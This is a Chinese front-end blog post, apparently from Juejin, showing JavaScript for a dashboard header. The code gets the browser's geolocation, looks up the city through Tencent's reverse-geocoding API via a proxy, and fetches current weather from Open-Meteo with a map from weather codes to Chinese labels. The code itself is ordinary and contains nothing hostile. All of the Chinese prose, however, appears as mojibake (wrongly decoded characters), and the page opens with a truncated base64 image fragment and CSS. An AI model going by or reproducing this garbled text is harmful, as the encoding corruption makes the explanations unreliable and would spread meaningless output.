BE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¹‹å‰åšè¿‡çš„å¤§å±é¡¹ç›®ä¸€èˆ¬æ˜¯åœ¨å†…ç½‘ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬é¡¶éƒ¨ä¸ç‰µæ‰¯å±•ç¤ºåŸå¸‚å’Œå¤©æ°”ã€‚ä½†æ˜¯è¿™æ¬¡åšçš„æ˜¯æ”¾åœ¨å¤–ç½‘çš„ï¼Œæ‰€ä»¥ç®€å•å®ç°ä¸€ä¸‹å±•ç¤ºåŸå¸‚åç§°å’Œå½“å‰å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-0">è·å–å½“å‰æ‰€å¤„ä½ç½®</h2>
<p>è·å–å½“å‰å®šä½å¯ä»¥é€šè¿‡æµè§ˆå™¨åŸç”Ÿçš„<code>Geolocation API</code>è·å–ç»çº¬åº¦ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getLocation</span>(<span class="hljs-params"/>) {
	<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
		<span class="hljs-keyword">if</span> (navigator.<span class="hljs-property">geolocation</span>) {
			navigator.<span class="hljs-property">geolocation</span>.<span class="hljs-title function_">getCurrentPosition</span>(
				<span class="hljs-function">(<span class="hljs-params">position</span>) =&gt;</span> {
					<span class="hljs-keyword">const</span> lat = position.<span class="hljs-property">coords</span>.<span class="hljs-property">latitude</span>;
					<span class="hljs-keyword">const</span> lon = position.<span class="hljs-property">coords</span>.<span class="hljs-property">longitude</span>;
					<span class="hljs-title function_">resolve</span>({lat, lon});
					<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å½“å‰ä½ç½®:'</span>, lat, lon);
				},
				<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
					<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ— æ³•è·å–ä½ç½®:'</span>, error.<span class="hljs-property">message</span>);
					<span class="hljs-title function_">reject</span>(error);
				}
			);
		}
	})
}
</code></pre>
<p>éœ€è¦æ³¨æ„ï¼Œ<code>Geolocation API</code>æ˜¯å¼‚æ­¥çš„ï¼Œæ‰€ä»¥è¿™é‡Œç”¨ <code>Promise</code> è¿›è¡Œäº†ç®€å•çš„å°è£…ã€‚å¦å¤–è¿™é‡Œåªèƒ½è·å–åˆ°ç»çº¬åº¦ï¼Œæ— æ³•è·å–åˆ°æ‰€åœ¨åŸå¸‚åç§°ï¼Œéœ€è¦é€šè¿‡é€†åœ°ç†ç¼–ç çš„æ–¹å¼å®ç°ã€‚</p>
<h2 data-id="heading-1">é€†åœ°ç†ç¼–ç </h2>
<p>ç›®å‰å›½å†…ä¸»è¦æ˜¯<strong>å¾¡ä¸‰å®¶</strong>æä¾›<strong>é€†åœ°ç†ç¼–ç </strong>çš„æœåŠ¡ï¼Œä½†æ˜¯éƒ½éœ€è¦è¿›è¡Œä»˜è´¹ï¼Œä¸è¿‡å”¯ä¸€å¯ä»¥åº†å¹¸çš„æ˜¯å„å®¶éƒ½æœ‰<strong>å…è´¹é¢åº¦</strong>ã€‚</p>
<p>å¦‚æœä½ çš„å¤§å±éƒ¨ç½²åœ¨å¤–ç½‘ï¼Œå›½å¤–çš„<strong>Nominatim</strong>æ˜¯å®Œå…¨å…è´¹çš„ï¼Œå’±ä»¬è¿™è¾¹ç›®å‰æ˜¯æ— æ³•è®¿é—®çš„ã€‚å®˜ç½‘åœ°å€ä¹Ÿæ”¾ä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fnominatim.openstreetmap.org" target="_blank" title="https://nominatim.openstreetmap.org" ref="nofollow noopener noreferrer">nominatim.openstreetmap.org</a>ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¥è…¾è®¯çš„é€†åœ°ç†ç¼–ç æœåŠ¡ä¸ºä¾‹å­ç®€å•å†™ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getCityName</span>(<span class="hljs-params">lat, lon</span>) {
	<span class="hljs-keyword">const</span> sig = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(<span class="hljs-string">`/ws/geocoder/v1/?key=<span class="hljs-subst">${ä½ çš„key}</span>&amp;location=<span class="hljs-subst">${lat}</span>,<span class="hljs-subst">${lon}</span><span class="hljs-subst">${ä½ çš„ç­¾å}</span>`</span>).<span class="hljs-title function_">toString</span>();
	<span class="hljs-keyword">const</span> {result} = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/tencent/ws/geocoder/v1/?key=<span class="hljs-subst">${ä½ çš„key}</span>&amp;location=<span class="hljs-subst">${lat}</span>,<span class="hljs-subst">${lon}</span>&amp;sig=<span class="hljs-subst">${sig}</span>`</span>);
	<span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${result.address_component.city}</span>-<span class="hljs-subst">${result.address_component.district}</span>`</span>
}
</code></pre>
<p>è¿™é‡Œéœ€è¦ä»£ç†ä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œçš„ä»£ç†å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">'/tencent'</span>: {
    <span class="hljs-attr">target</span>: <span class="hljs-string">'https://apis.map.qq.com'</span>,
    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\/tencent/</span>, <span class="hljs-string">''</span>)
},
</code></pre>
<h2 data-id="heading-2">è·å–å¤©æ°”</h2>
<p>å¤©æ°”ä¿¡æ¯ç›®å‰å’±ä»¬è¿™è¾¹æœ‰å’Œé£å¤©æ°”ï¼Œæä¾›äº†ä¸€å®šçš„å…è´¹é¢åº¦ã€‚</p>
<p>ä½†æ˜¯æˆ‘åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªå¤–é¢çš„ï¼Œä½†æ˜¯å’±ä»¬è¿™è¾¹èƒ½è®¿é—®åˆ°çš„<strong>Open-Meteo</strong>ï¼Œå®˜æ–¹åœ°å€ä¹Ÿæ”¾ä¸€ä¸‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen-meteo.com" target="_blank" title="https://open-meteo.com" ref="nofollow noopener noreferrer">open-meteo.com</a>ã€‚</p>
<p>ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ— éœ€æ³¨å†Œã€æ—  API Keyã€æ— è°ƒç”¨é™åˆ¶</li>
<li>æ”¯æŒå…¨çƒç»çº¬åº¦å®æ—¶å¤©æ°” + æœªæ¥7å¤©é¢„æŠ¥</li>
<li>æ•°æ®æ¥æºï¼šæ¬§æ´²ä¸­æœŸå¤©æ°”é¢„æŠ¥ä¸­å¿ƒï¼ˆECMWFï¼‰ç­‰æƒå¨æœºæ„</li>
</ul>
<p>å”¯ä¸€ä¸å¥½çš„ä¸€ç‚¹åœ¨äºè¿”å›çš„éƒ½æ˜¯è‹±æ–‡æ•°æ®ï¼Œéœ€è¦è®¤ä¸ºçš„è½¬æˆä¸­æ–‡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// éƒ¨åˆ†å¤©æ°”ä¸­è‹±æ–‡æ˜ å°„</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WEATHER_CODE_MAP</span> = {
	<span class="hljs-number">0</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Clear sky'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'æ™´'</span> },
	<span class="hljs-number">1</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Mainly clear'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'æ™´è½¬å¤šäº‘'</span> },
	<span class="hljs-number">2</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Partly cloudy'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å¤šäº‘'</span> },
	<span class="hljs-number">3</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Overcast'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'é˜´'</span> },
	<span class="hljs-number">45</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Fog'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'é›¾'</span> },
	<span class="hljs-number">48</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Depositing rime fog'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å†»é›¾'</span> },
	<span class="hljs-number">51</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Drizzle: Light'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å°é›¨'</span> },
	<span class="hljs-number">53</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Drizzle: Moderate'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'ä¸­é›¨'</span> },
	<span class="hljs-number">55</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Drizzle: Dense'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å¤§é›¨'</span> },
	<span class="hljs-number">61</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Rain: Slight'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å°é›¨'</span> },
	<span class="hljs-number">63</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Rain: Moderate'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'ä¸­é›¨'</span> },
	<span class="hljs-number">65</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Rain: Heavy'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å¤§é›¨'</span> },
	<span class="hljs-number">71</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Snow fall: Slight'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å°é›ª'</span> },
	<span class="hljs-number">73</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Snow fall: Moderate'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'ä¸­é›ª'</span> },
	<span class="hljs-number">75</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Snow fall: Heavy'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'å¤§é›ª'</span> },
	<span class="hljs-number">95</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Thunderstorm'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'é›·é˜µé›¨'</span> },
	<span class="hljs-number">96</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Thunderstorm with slight hail'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'é›·é˜µé›¨ä¼´å°å†°é›¹'</span> },
	<span class="hljs-number">99</span>: { <span class="hljs-attr">en</span>: <span class="hljs-string">'Thunderstorm with heavy hail'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'é›·é˜µé›¨ä¼´å¤§å†°é›¹'</span> }
};
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// è·å–å¤©æ°”</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getWeather</span>(<span class="hljs-params">lat, lon</span>) {
	<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://api.open-meteo.com/v1/forecast?latitude=<span class="hljs-subst">${lat}</span>&amp;longitude=<span class="hljs-subst">${lon}</span>&amp;current_weather=true`</span>);
	<span class="hljs-keyword">const</span> code = result.<span class="hljs-property">current_weather</span>.<span class="hljs-property">weathercode</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-variable constant_">WEATHER_CODE_MAP</span>[code] || {<span class="hljs-attr">en</span>: <span class="hljs-string">'Unknown'</span>, <span class="hljs-attr">zh</span>: <span class="hljs-string">'æœªçŸ¥'</span>};
}
</code></pre>
<p>è¿™ä¸ªæ˜¯ä¸éœ€è¦ä»£ç†çš„ï¼Œå› ä¸º<strong>Open-Meteo</strong>æœ¬èº«æ”¯æŒ<code>CORS</code>ã€‚</p>
<h2 data-id="heading-3">æ€»ç»“</h2>
<p>è·å–ç»çº¬åº¦å’ŒåŸå¸‚ä¿¡æ¯ï¼Œä»¥åŠå¤©æ°”ä¿¡æ¯åœ¨æŠ€æœ¯ä¸Šæ²¡ä»€ä¹ˆéš¾åº¦ã€‚</p>
<p>ä¸»è¦çš„é—®é¢˜ç‚¹åœ¨äºå¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ä»˜è´¹çš„ï¼Œè‡ªå·±ç©ç©è¿˜å¥½ï¼Œä½†è¦æ˜¯çœŸçš„ä¸Šçº¿æ­£å¼ç¯å¢ƒä¸€å®šè¦<strong>é˜²å¤‡</strong>è¢«åˆ«äººæ¶æ„åˆ·çˆ†ã€‚</p>
<p>ä¹‹å‰æˆ‘è¿˜è§è¿‡ä¸€ä¸ªå¤§å±ä¸Šå®æ—¶å±•ç¤ºå¤©æ°”çŠ¶å†µï¼Œå«æ˜Ÿåœ°å›¾ä¸Šå‰é¢æœ‰ä¸€å±‚è’™ç‰ˆå±•ç¤ºã€‚å¦‚æœæ˜¯ä¸‹é›¨çš„è¯æœ‰é›¨æ»´æ‰“åœ¨å±å¹•ä¸Šçš„æ„Ÿè§‰ï¼Œæ•ˆæœéå¸¸ä¸é”™ï¼Œå›å¤´å®ç°å®Œåˆ†äº«ç»™å¤§å®¶ã€‚</p>
<p>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·<strong>æå‰‘ä¸€</strong>ï¼Œåˆ†äº«æ›´å¤šçš„å¹²è´§ï¼Œç•…èŠåœˆå†…å…«å¦ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>